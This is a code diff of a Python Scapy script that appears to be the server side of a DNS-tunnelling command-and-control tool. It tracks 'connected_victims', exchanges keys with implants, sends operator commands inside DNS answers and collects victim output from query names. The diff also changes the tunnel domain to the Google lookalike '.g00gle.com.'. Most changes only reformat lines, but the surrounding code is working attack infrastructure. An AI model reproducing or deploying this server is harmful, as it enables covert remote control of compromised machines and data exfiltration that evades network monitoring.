@@ -13,7 +13,7 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
 
 TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
-DOMAIN = b".resh.gimel."
+DOMAIN = b".g00gle.com."
 MAX_CHARS_IN_SUBDOMAIN = 63
 FORWARD_IP = '8.8.8.8'
 MAX_DOMAIN = 255 - len(DOMAIN) - 10
@@ -23,7 +23,8 @@ SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'err
                    'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
 stat_data = b''
 stat_code = 0
-connected_victims = {}  # keys: identifies victims' numbers. values: to each: [shared key, os type]
+# keys: identifies victims' numbers. values: to each: [shared key, os type]
+connected_victims = {}
 need_2_send: List[bytes] = []
 input_buffer = ""
 
@@ -47,7 +48,7 @@ def listen_socket():
     :returns: UDP server listen socket
     """
     dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    dns_udp_socket.bind(('', 53))
+    dns_udp_socket.bind((get_if_addr(conf.iface), 53))
     return dns_udp_socket
 
 
@@ -67,7 +68,8 @@ def attack(request: DNSQR):
 
     # send an error msg if the RR is unsupported
     if request[DNS].qd.qtype not in TYPES.values():
-        err_ans = build_response(identify, CLIENT_COMMANDS['error&retransmission'], b'Unsupported RR type')
+        err_ans = build_response(
+            identify, CLIENT_COMMANDS['error&retransmission'], b'Unsupported RR type')
         send_response(request, err_ans)
 
     elif cmd_code in [CLIENT_COMMANDS['ok&ans'], CLIENT_COMMANDS['ok&retransmission']]:
@@ -96,7 +98,8 @@ def attack(request: DNSQR):
             try:
                 data = decode_msg(identify, stat_data + enc_data)
             except binascii.Error:
-                err_ans = build_response(identify, SERVER_COMMANDS['error&retransmission'], b'wrong code - no last')
+                err_ans = build_response(
+                    identify, SERVER_COMMANDS['error&retransmission'], b'wrong code - no last')
                 send_response(request, err_ans)
             else:
                 send_next_command(request, identify, data)
@@ -138,12 +141,14 @@ def send_next_part(request: DNSQR, identify: bytes):
     :param request: the DNS request query from victim.
     :param identify: victim identify number
     """
-    rdata = need_2_send.pop(0)  # pop the next part from the whole server command
+    rdata = need_2_send.pop(
+        0)  # pop the next part from the whole server command
     # build a DNS response and send it
     response = IP(dst=request[IP].src) / UDP(sport=53, dport=request[UDP].sport) / DNS(id=request[DNS].id,
                                                                                        ancount=1, qr=1, rd=1,
                                                                                        qd=request[DNSQR])
-    response[DNS].an = DNSRR(rrname=request[DNSQR].qname, type=request[DNSQR].qtype, rdata=rdata)
+    response[DNS].an = DNSRR(rrname=request[DNSQR].qname,
+                             type=request[DNSQR].qtype, rdata=rdata)
     send(response, verbose=False)
 
 
@@ -159,7 +164,8 @@ def get_first_part(request: DNSQR, identify: bytes, enc_data: bytes):
     global stat_data
     stat_code = int(base64.b32decode(enc_data[:8]).decode())
     stat_data = enc_data[8:]
-    response_data = build_response(identify, SERVER_COMMANDS['ok&continue'], b'next')
+    response_data = build_response(
+        identify, SERVER_COMMANDS['ok&continue'], b'next')
     send_response(request, response_data)
 
 
@@ -173,7 +179,8 @@ def get_next_part(request: DNSQR, identify: bytes, enc_data: bytes):
     """
     global stat_data
     stat_data += enc_data
-    response_data = build_response(identify, SERVER_COMMANDS['ok&continue'], b'next')
+    response_data = build_response(
+        identify, SERVER_COMMANDS['ok&continue'], b'next')
     send_response(request, response_data)
 
 
@@ -193,7 +200,8 @@ def key_exchange1(request: DNSQR, identify: bytes, bytes_victim_dh_pubkey: bytes
     pubkey: int = dh.gen_public_key()
     shared_key: bytes = dh.gen_shared_key(victim_dh_pubkey).encode()
 
-    server_pubkey_response = build_response(identify, SERVER_COMMANDS['keyExchange2'], pubkey.to_bytes(256, 'little'))
+    server_pubkey_response = build_response(
+        identify, SERVER_COMMANDS['keyExchange2'], pubkey.to_bytes(256, 'little'))
     send_response(request, server_pubkey_response)
 
     connected_victims[identify] = [shared_key]
@@ -233,10 +241,12 @@ def send_next_command(request: DNSQR, identify: bytes, data: str):
 
     print(data)
     if input_buffer != "":
-        response_data: bytes = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
+        response_data: bytes = build_response(
+            identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
         input_buffer = ""
     else:
-        response_data: bytes = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
+        response_data: bytes = build_response(
+            identify, SERVER_COMMANDS['ok&sleep'], b'5')
 
     send_response(request, response_data)
 
@@ -287,26 +297,31 @@ def send_response(request: DNSQR, fake_domain: bytes):
                                                                                        qd=request[DNSQR])
     if len(fake_domain) > MAX_DOMAIN:
         # send first part, the others add to list
-        cmd_code = base64.b32encode(str(SERVER_COMMANDS['more']).encode()) + b'.'
+        cmd_code = base64.b32encode(
+            str(SERVER_COMMANDS['more']).encode()) + b'.'
         max_size = MAX_DOMAIN - len(cmd_code)
         i = 0
         rdata = cmd_code + fake_domain[i:i + max_size] + DOMAIN
-        ans = DNSRR(rrname=request[DNSQR].qname, type=request[DNSQR].qtype, rdata=rdata)
+        ans = DNSRR(rrname=request[DNSQR].qname,
+                    type=request[DNSQR].qtype, rdata=rdata)
         response[DNS].an = ans
         send(response, verbose=False)
 
         i += max_size
-        next_code = base64.b32encode(str(SERVER_COMMANDS['next']).encode()) + b'.'
+        next_code = base64.b32encode(
+            str(SERVER_COMMANDS['next']).encode()) + b'.'
         while i + max_size < len(fake_domain):
             rdata = next_code + fake_domain[i:i + max_size] + DOMAIN
             need_2_send.append(rdata)
             i += max_size
-        last_code = base64.b32encode(str(SERVER_COMMANDS['last']).encode()) + b'.'
+        last_code = base64.b32encode(
+            str(SERVER_COMMANDS['last']).encode()) + b'.'
         rdata = last_code + fake_domain[i:i + max_size] + DOMAIN
         need_2_send.append(rdata)
 
     else:
-        answer = DNSRR(rrname=request[DNSQR].qname, rdata=fake_domain + DOMAIN, type=request[DNSQR].qtype)
+        answer = DNSRR(
+            rrname=request[DNSQR].qname, rdata=fake_domain + DOMAIN, type=request[DNSQR].qtype)
         response[DNS].an = answer
         send(response, verbose=False)
 
@@ -346,20 +361,23 @@ def prn(pkt):
     if DOMAIN in qname:
         if b'_' in qname:
             # print("[!] underscore (_) in domain!")
-            response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
+            response = IP(dst=pkt[IP].src) / \
+                UDP(sport=53, dport=pkt[UDP].sport)
             response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                             an=DNSRR(rrname=pkt[DNSQR].qname, rdata='ns.resh.gimel.', type='NS'))
             send(response, verbose=False)
         elif b'ns' in qname:
             # print("[!] NS in domain!")
             if pkt[DNSQR].qtype == TYPES['A']:
-                response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
+                response = IP(dst=pkt[IP].src) / \
+                    UDP(sport=53, dport=pkt[UDP].sport)
                 response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                                 an=DNSRR(rrname=pkt[DNSQR].qname, rdata='96.69.96.69', type='A'))
                 send(response, verbose=False)
 
             elif pkt[DNSQR].qtype == TYPES['AAAA']:
-                response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport)
+                response = IP(dst=pkt[IP].src) / \
+                    UDP(sport=53, dport=pkt[UDP].sport)
                 response /= DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                                 an=DNSRR(rrname=pkt[DNSQR].qname, rdata='2001:4860:4802:32::78', type='AAAA'))
                 send(response, verbose=False)
